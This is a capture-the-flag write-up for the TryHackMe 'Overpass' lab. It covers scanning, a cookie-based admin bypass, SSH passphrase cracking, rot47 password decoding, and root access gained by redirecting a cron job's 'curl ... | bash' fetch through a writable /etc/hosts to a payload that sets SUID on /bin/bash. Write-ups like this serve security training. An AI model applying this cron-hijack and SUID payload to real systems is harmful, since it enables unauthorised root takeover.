# Overpass

## Nmap Results
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU=
|   256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Found source code for overpass program... `overpass.go`
Interesting thing it encrypts passwords with rot47 encryption on a local file on ~/.overpass

## Gobuster results 
`gobuster dir -x php,txt,html,css,js -u http://10.10.199.188/ -w /usr/share/wordlists/dirb/common.txt | tee gobuster.log`

```
/404.html (Status: 200)
/aboutus (Status: 301)
/admin (Status: 301)
/admin.html (Status: 200)
/cookie.js (Status: 200)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
/index.html (Status: 301)
/index.html (Status: 301)
/login.js (Status: 200)
/main.css (Status: 200)
/main.js (Status: 200)
```

Interesting admin location
In admin if we change the SessionToken Cookie to anything over BurpSuite or Developer tools of the browser we can completely bypass the login check and get ourselves an ssh key
```
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox
```
Based on this we will have to crack the ssh key passphrase
Cracking James' passphrase with john the ripper 
`james13          (James)`

ssh in
todo.txt on ~ folder of james
```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```
Means we gonna have to get .overpass file to get the code
`,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.`
Decrypted: `[{"name":"System","pass":"saydrawnlyingpicture"}]`
This could be either a root password or james local password on the machine     It's james password but james can't run sudo :(

crontab has a job running every minute `curl overpass.thm/downloads/src/buildscript.sh | bash`
Crontab file is only readable so we can't hange the url or the command..
/etc/hosts file is world writable though!

Changing the ip of the overpass.thm link to my tun0 ip > Then i make the path it is going to request ./downloads/src/buildscript.sh
inside to the buildscript.sh file
```
#!/bin/bash
chmod +s /bin/bash
```

This will download the file and pipe into bash and enable the suid bit on /bin/bash binary to help me escalate privileges
and after i run /bin/bash -p as james i get a new root shell!
## Question 1
#### Hack the machine and get the flag in user.txt
This answer will not be disclosed in this write-up


## Question 2
#### Escalate your privileges and get the flag in root.txt
This answer will not be disclosed in this write-up

# Bonus easter egg!
On /home/tryhackme folder there is a .overpass file `,LQ?2>6QiQ%CJw24<|6 $F3D4C:AE:@? r@56Q[QA2DDQiQ8>%sJ=QN.`
`[{"name":"TryHackMe Subscription Code","pass":"gmTDyl"}]`

